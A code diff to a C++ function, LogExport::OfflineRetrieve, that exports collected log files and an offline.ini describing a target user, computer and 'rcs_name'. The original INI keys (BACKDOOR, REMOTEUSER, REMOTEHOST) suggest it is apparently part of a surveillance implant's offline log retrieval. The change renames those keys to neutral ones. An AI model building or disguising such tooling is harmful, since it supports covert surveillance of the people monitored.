@@ -97,7 +97,6 @@ BOOL LogExport::OfflineRetrieve()
 	char *tmp_ptr;
 	WCHAR clear_path[MAX_PATH];
 	WCHAR dest_path[MAX_PATH];
-	WCHAR dest_subfolder[MAX_PATH];
 	SYSTEMTIME system_time;
 	FILETIME file_time;
 	DWORD curr_file=1, tot_file=1;
@@ -112,49 +111,32 @@ BOOL LogExport::OfflineRetrieve()
 	// Crea una directory per i log di questo utente
 	GetSystemTime(&system_time);
 	SystemTimeToFileTime(&system_time, &file_time);	
-	swprintf_s(dest_path, sizeof(dest_path)/sizeof(dest_path[0]), L"%s\\RLD_%.8X%.8X000000000000000000000000", m_dest_drive, file_time.dwHighDateTime, file_time.dwLowDateTime);
+	swprintf_s(dest_path, sizeof(dest_path)/sizeof(dest_path[0]), L"%s\\%s_EXP_%.8X%.8X000000000000000000000000", m_dest_drive, m_rcs_info.rcs_name, file_time.dwHighDateTime, file_time.dwLowDateTime);
 	if (!CreateDirectory(dest_path, NULL))
-		return FALSE;
-	swprintf_s(dest_subfolder, sizeof(dest_subfolder)/sizeof(dest_subfolder[0]), L"%s\\dec", dest_path);
-	if (!CreateDirectory(dest_subfolder, NULL))
-		return FALSE;
-	swprintf_s(dest_subfolder, sizeof(dest_subfolder)/sizeof(dest_subfolder[0]), L"%s\\aud", dest_path);
-	if (!CreateDirectory(dest_subfolder, NULL))
-		return FALSE;
-	swprintf_s(dest_subfolder, sizeof(dest_subfolder)/sizeof(dest_subfolder[0]), L"%s\\enc", dest_path);
-	if (!CreateDirectory(dest_subfolder, NULL))
 		return FALSE;
 
 	// Crea il file con le info dell'utente
-	swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\OFFLINE.ini", dest_path);
+	swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\offline.ini", dest_path);
 	PrepareIniFile(clear_path);
-	if (!WritePrivateProfileStringW(L"OFFLINE", L"REMOTEUSER", m_user_name, clear_path))
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"USERID", m_user_name, clear_path))
 		return FALSE;
-	if (!WritePrivateProfileStringW(L"OFFLINE", L"REMOTEHOST", m_computer_name, clear_path))
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"DEVICEID", m_computer_name, clear_path))
 		return FALSE;
-	if (!WritePrivateProfileStringW(L"OFFLINE", L"BACKDOOR", m_rcs_info.rcs_name, clear_path))
+	if (!WritePrivateProfileStringW(L"OFFLINE", L"FACTORY", m_rcs_info.rcs_name, clear_path))
 		return FALSE;
 	if (!WritePrivateProfileStringW(L"OFFLINE", L"INSTANCE", m_user_hash, clear_path))
 		return FALSE;
 
 	if (m_os_type == WIN_OS) {
-		if (m_arch_type == 32) {
-			if (!WritePrivateProfileStringW(L"OFFLINE", L"SUBTYPE", L"WIN32", clear_path))
-				return FALSE;
-		} else {
-			if (!WritePrivateProfileStringW(L"OFFLINE", L"SUBTYPE", L"WIN64", clear_path))
-				return FALSE;
-		}
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"WINDOWS", clear_path))
+			return FALSE;
 	} else if (m_os_type == MAC_OS) {
-		if (!WritePrivateProfileStringW(L"OFFLINE", L"SUBTYPE", L"MACOS", clear_path))
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"MACOS", clear_path))
 			return FALSE;
 	} else {
-		if (!WritePrivateProfileStringW(L"OFFLINE", L"SUBTYPE", L"UNKNOWN", clear_path))
+		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"UNKNOWN", clear_path))
 			return FALSE;
 	}
-
-	if (!WritePrivateProfileStringW(L"OFFLINE", L"REMOTEIP", L"OFFLINE", clear_path))
-		return FALSE;
 
 	// Setta la data dell'export
 	LARGE_INTEGER li_time, li_bias;
@@ -212,9 +194,9 @@ BOOL LogExport::OfflineRetrieve()
 				*tmp_ptr = 0x00;
 				GetSystemTime(&system_time);
 				SystemTimeToFileTime(&system_time, &file_time);
-				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\enc\\%S_%.8X%.8X.bin", dest_path, clear_nameA, file_time.dwHighDateTime, file_time.dwLowDateTime);
+				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%S_%.8X%.8X.bin", dest_path, clear_nameA, file_time.dwHighDateTime, file_time.dwLowDateTime);
 			} else {
-				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\enc\\%S", dest_path, clear_nameA);
+				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%S", dest_path, clear_nameA);
 			}
 			SAFE_FREE(clear_nameA);
 
